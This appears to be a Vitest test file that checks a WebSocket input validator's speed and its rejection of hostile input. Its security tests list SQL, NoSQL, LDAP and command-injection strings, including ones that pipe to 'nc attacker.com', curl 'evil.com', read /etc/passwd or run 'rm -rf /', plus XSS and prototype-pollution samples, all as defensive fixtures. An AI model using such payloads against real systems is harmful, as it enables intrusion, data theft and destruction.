// Performance and Security tests for WebSocket validation
// Tests performance requirements and security attack scenarios

import { describe, test, expect, beforeEach } from 'vitest';
import SocketValidator from '../../lib/validation/socket-validator.js';

describe('SocketValidator Performance Tests', () => {
  let validator;
  
  beforeEach(() => {
    validator = new SocketValidator();
  });

  test('validates within performance target (<2ms)', () => {
    const testData = {
      characterId: 'alexander-kane',
      command: 'kill',
      args: { processId: 'p123' }
    };
    
    const iterations = 1000;
    const start = process.hrtime.bigint();
    
    for (let i = 0; i < iterations; i++) {
      validator.validate('debug-command', testData);
    }
    
    const end = process.hrtime.bigint();
    const avgMs = Number(end - start) / iterations / 1000000;
    
    expect(avgMs).toBeLessThan(2); // Must be under 2ms per validation
  });

  test('handles high-frequency validation efficiently', () => {
    const testEvents = [
      { event: 'debug-command', data: { characterId: 'test', command: 'kill' } },
      { event: 'start-monitoring', data: { characterId: 'test' } },
      { event: 'stop-monitoring', data: {} },
      { event: 'refresh-monitor', data: {} },
      { event: 'get-system-resources', data: {} }
    ];
    
    const iterations = 10000;
    const start = process.hrtime.bigint();
    
    for (let i = 0; i < iterations; i++) {
      const testCase = testEvents[i % testEvents.length];
      validator.validate(testCase.event, testCase.data);
    }
    
    const end = process.hrtime.bigint();
    const totalMs = Number(end - start) / 1000000;
    const avgMs = totalMs / iterations;
    
    expect(avgMs).toBeLessThan(1); // Should be well under 2ms for mixed events
    expect(totalMs).toBeLessThan(5000); // Total should be under 5 seconds
  });

  test('pre-compiled validators perform better than runtime compilation', () => {
    const testData = { characterId: 'test', command: 'kill' };
    
    // Test pre-compiled validator performance
    const start1 = process.hrtime.bigint();
    for (let i = 0; i < 1000; i++) {
      validator.validate('debug-command', testData);
    }
    const end1 = process.hrtime.bigint();
    const precompiledTime = Number(end1 - start1) / 1000000;
    
    // Pre-compiled should be very fast
    expect(precompiledTime).toBeLessThan(100); // Under 100ms for 1000 validations
  });
});

describe('SocketValidator Security Tests', () => {
  let validator;
  
  beforeEach(() => {
    validator = new SocketValidator();
  });

  describe('Injection Attack Prevention', () => {
    test('prevents SQL injection variations', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM characters WHERE '1'='1'; --",
        "' UNION SELECT * FROM admin_users --",
        "'; INSERT INTO logs VALUES ('hacked'); --"
      ];
      
      sqlInjections.forEach(injection => {
        const result = validator.validate('debug-command', {
          characterId: injection,
          command: 'kill'
        });
        
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Invalid format for field: characterId');
      });
    });

    test('prevents NoSQL injection variations', () => {
      const noSqlInjections = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.password.length > 0' },
        { $or: [{ admin: true }, { user: 'admin' }] }
      ];
      
      noSqlInjections.forEach(injection => {
        const result = validator.validate('debug-command', {
          characterId: injection,
          command: 'kill'
        });
        
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Wrong type for field: characterId, expected string');
      });
    });

    test('prevents command injection attempts', () => {
      const commandInjections = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test; curl http://evil.com/steal',
        'test`whoami`'
      ];
      
      commandInjections.forEach(injection => {
        const result = validator.validate('debug-command', {
          characterId: injection,
          command: 'kill'
        });
        
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Invalid format for field: characterId');
      });
    });

    test('prevents LDAP injection attempts', () => {
      const ldapInjections = [
        'test)(|(password=*))',
        'test*)(uid=*))(|(uid=*',
        'test)(cn=*))((|(cn=*'
      ];
      
      ldapInjections.forEach(injection => {
        const result = validator.validate('debug-command', {
          characterId: injection,
          command: 'kill'
        });
        
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Invalid format for field: characterId');
      });
    });
  });

  describe('Prototype Pollution Prevention', () => {
    test('prevents __proto__ pollution', () => {
      const result = validator.validate('debug-command', {
        characterId: 'test',
        command: 'kill',
        'constructor': { polluted: true }
      });

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Unknown field: constructor');
    });

    test('prevents constructor pollution', () => {
      const result = validator.validate('debug-command', {
        characterId: 'test',
        command: 'kill',
        'constructor': { prototype: { polluted: true } }
      });
      
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Unknown field: constructor');
    });

    test('prevents nested prototype pollution', () => {
      const result = validator.validate('player-intervention', {
        characterId: 'test',
        intervention: {
          type: 'memory_boost',
          'constructor': { polluted: true }
        }
      });

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Unknown field: constructor');
    });
  });

  describe('DoS Attack Prevention', () => {
    test('handles extremely large payloads gracefully', () => {
      const largeString = 'a'.repeat(1000000); // 1MB string
      
      const result = validator.validate('debug-command', {
        characterId: largeString,
        command: 'kill'
      });
      
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Invalid length for field: characterId');
    });

    test('handles deeply nested objects', () => {
      let deepObject = { characterId: 'test', command: 'kill' };
      for (let i = 0; i < 100; i++) {
        deepObject = { nested: deepObject };
      }
      
      const result = validator.validate('debug-command', deepObject);
      
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Missing required field: characterId');
    });

    test('handles arrays with many elements', () => {
      const result = validator.validate('debug-command', {
        characterId: 'test',
        command: 'kill',
        args: {
          largeArray: new Array(10000).fill('item')
        }
      });
      
      // Should reject due to unknown field, not crash
      expect(result.valid).toBe(false);
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    test('handles Unicode normalization attacks', () => {
      const unicodeAttacks = [
        'test\u0000', // Null byte
        'test\uFEFF', // BOM
        'test\u202E', // Right-to-left override
        'test\u200B', // Zero-width space
        'test\uFFFE'  // Invalid Unicode
      ];
      
      unicodeAttacks.forEach(attack => {
        const result = validator.validate('debug-command', {
          characterId: attack,
          command: 'kill'
        });
        
        // Should either be rejected by pattern or handled safely
        if (!result.valid) {
          expect(result.errors).toContain('Invalid format for field: characterId');
        }
      });
    });

    test('handles homograph attacks', () => {
      const homographs = [
        'аdmin', // Cyrillic 'а' instead of Latin 'a'
        'аlexander-kane', // Mixed scripts
        'test‐user' // Different hyphen character
      ];
      
      homographs.forEach(homograph => {
        const result = validator.validate('debug-command', {
          characterId: homograph,
          command: 'kill'
        });
        
        expect(result.valid).toBe(false);
        expect(result.errors).toContain('Invalid format for field: characterId');
      });
    });
  });

  describe('Error Message Security', () => {
    test('error messages do not leak schema information', () => {
      const result = validator.validate('debug-command', {
        characterId: 'test',
        command: 'invalid_command'
      });
      
      expect(result.valid).toBe(false);
      expect(result.errors[0]).not.toContain('enum');
      expect(result.errors[0]).not.toContain('schema');
      expect(result.errors[0]).not.toContain('ajv');
    });

    test('error messages do not expose internal paths', () => {
      const result = validator.validate('player-intervention', {
        characterId: 'test',
        intervention: {
          type: 'invalid_type'
        }
      });
      
      expect(result.valid).toBe(false);
      result.errors.forEach(error => {
        expect(error).not.toContain('/intervention/type');
        expect(error).not.toContain('instancePath');
        expect(error).not.toContain('schemaPath');
      });
    });

    test('handles malicious field names safely', () => {
      const result = validator.validate('debug-command', {
        characterId: 'test',
        command: 'kill',
        '<script>alert("xss")</script>': 'malicious'
      });

      expect(result.valid).toBe(false);
      expect(result.errors[0]).toBe('Unknown field: field'); // Sanitized field name
    });
  });
});
